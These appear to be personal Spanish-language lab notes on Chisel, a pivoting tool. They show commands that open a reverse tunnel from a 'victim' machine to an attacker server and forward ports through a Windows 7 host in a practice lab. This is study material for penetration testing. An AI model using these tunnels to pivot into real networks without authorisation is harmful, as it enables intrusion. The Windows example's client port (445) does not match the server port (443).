Chisel es una herramienta de pivoting compatible tanto con máquinas Windows como Linux. Nos permite de forma muy cómoda prácticamente obtener las mismas funciones que SSH (en el aspecto de Port Forwarding).

Tenemos un repositorio oficial para descargar la herramienta:
```bash
https://github.com/jpillora/chisel/releases
```
![[Mis apuntes/ANEXOS/Pasted image 20230804090601.png]]
![[Mis apuntes/ANEXOS/Pasted image 20230804090727.png]]


# Crear tunel con Chisel
Aquí lo tenemos en la maquina atacante
![[Pasted image 20240603101617.png]]

Y aqui en la maquina victima
![[Pasted image 20240603102122.png]]


Una vez esta creado levantamos un servidor en la maquina atacante
```bash
./chisel server -p 8000 --reverse
```
![[Pasted image 20240603102321.png]]

Y para conectarnos desde la maquina victima usaremos el siguiente comando
```bash
./chisel client 10.9.0.138:8000 R:9001:127.0.0.1:9001
```
![[Pasted image 20240603102512.png]]

Si volvemos donde hemos levantado el servidor aparecera la conexión creada
![[Pasted image 20240603102601.png]]

Y ya podríamos acceder a nuestro servicio desde nuestra maquina atacante
![[Pasted image 20240603102640.png]]

[[MAQUINA CHILL HACK (Fuzzing web, fuerza bruta con BurpSuit, Reverse Shell con ejecución de comandos en web, TTY interactiva y portforwarding con Chisel y SSH]]

-------

# Chisel con maquina Windows

Este será el laboratorio:
![[Mis apuntes/ANEXOS/Pasted image 20230804090827.png]]

------------------

Una vez con todo desplegado, tenemos que ejecutar chisel tanto en la máquina atacante como en la máquina windows 7 intermedia:
![[Mis apuntes/ANEXOS/Pasted image 20230804091121.png]]

Y la versión de windows la descomprimimos en nuestro Linux y la compartimos con la máquina intermedia:
![[Mis apuntes/ANEXOS/Pasted image 20230804091428.png]]
![[Mis apuntes/ANEXOS/Pasted image 20230804091512.png]]

Y lo tenemos localizable:
![[Mis apuntes/ANEXOS/Pasted image 20230804091549.png]]

Y si lo ejecutamos en ambos sitios, vemos que funciona:
![[Mis apuntes/ANEXOS/Pasted image 20230804091757.png]]

En la máquina windows establecemos el servidor, con el siguiente comando:
```bash
chisel.exe server -p 443
```
![[Mis apuntes/ANEXOS/Pasted image 20230804091913.png]]

Y ahora desde el Kali tenemos que establecer el cliente, de tal forma que lo haremos con la siguiente metodología:
```bash
chisel client <dirección servidor chisel>:<puerto servidor chisel> <puerto local a abrir>:<dirección a donde apuntar>:<puerto a apuntar de la direccion donde se apunta>`
```

El comando es el siguiente:
```bash
./chisel_1.8.1_linux_amd64 client 192.168.0.48:445 5000:192.168.0.30:5000
```
